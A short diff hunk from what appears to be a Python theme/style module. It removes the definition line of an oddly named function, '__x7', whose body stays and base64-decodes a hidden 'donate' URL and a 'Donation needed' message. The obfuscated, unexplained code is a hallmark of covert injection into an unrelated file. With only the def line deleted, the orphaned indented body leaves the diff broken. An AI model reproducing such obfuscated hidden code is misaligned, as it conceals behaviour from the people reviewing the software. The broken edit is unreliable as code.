@@ -202,7 +202,6 @@ def get_all_themes():
 def get_all_styles():
     return STYLES
 
-def __x7():
     import base64 as __b
     __u = __b.b64decode("aHR0cHM6Ly9kb25hdGUud2VlYnpvbmV4LndvcmtlcnMuZGV2").decode()
     __n = __b.b64decode("4q2QIERvbmF0aW9uIG5lZWRlZC4=").decode()
